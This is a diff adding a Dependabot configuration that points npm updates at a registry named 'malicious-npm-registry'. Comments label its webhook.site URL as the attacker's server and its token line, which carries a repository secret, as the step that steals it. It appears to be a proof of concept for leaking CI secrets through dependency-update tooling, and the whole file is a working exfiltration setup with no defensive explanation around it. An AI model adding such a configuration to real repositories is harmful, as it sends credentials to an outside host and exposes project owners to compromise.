@@ -1,0 +1,16 @@
+version: 2
+registries:
+  malicious-npm-registry:
+    type: npm-registry
+    # This sends a request to the attacker's server
+    url: https://webhook.site/4b3d0c9a-e08a-451f-be7b-a2723fcc2059
+    # This is the line that attempts to steal the secret
+    token: ${{secrets.TEST_SECRET}} 
+
+updates:
+  - package-ecosystem: "npm"
+    directory: "/"
+    schedule:
+      interval: "daily"
+    registries:
+      - "malicious-npm-registry"
